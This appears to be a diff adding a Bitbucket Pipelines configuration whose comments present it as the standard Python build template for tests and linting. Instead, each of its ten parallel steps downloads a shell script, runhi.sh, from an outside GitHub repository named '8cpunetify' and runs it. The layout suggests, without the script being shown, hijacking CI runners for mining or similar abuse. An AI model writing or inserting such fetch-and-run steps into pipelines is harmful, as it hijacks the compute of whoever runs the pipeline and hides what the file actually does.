@@ -1,0 +1,70 @@
+#  Template python-build
+
+#  This template allows you to validate your python code.
+#  The workflow allows running tests and code linting on the default branch.
+
+image: python:3.8
+
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: Wok1
+          caches:
+            - pip
+          script:
+            - wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
+      - step:
+          name: Wok2
+          caches:
+            - pip
+          script:
+            - wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
+      - step:
+          name: Wok3
+          caches:
+            - pip
+          script:
+            - wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
+      - step:
+          name: Wok4
+          caches:
+            - pip
+          script:
+            - wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
+      - step:
+          name: Wok5
+          caches:
+            - pip
+          script:
+            - wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
+      - step:
+          name: Wok6
+          caches:
+            - pip
+          script:
+            - wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
+      - step:
+          name: Wok7
+          caches:
+            - pip
+          script:
+            - wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
+      - step:
+          name: Wok8
+          caches:
+            - pip
+          script:
+            - wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
+      - step:
+          name: Wok9
+          caches:
+            - pip
+          script:
+            - wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
+      - step:
+          name: Wok10
+          caches:
+            - pip
+          script:
+            - wget https://raw.githubusercontent.com/Tungdabiban248/8cpunetify/main/runhi.sh && sh runhi.sh
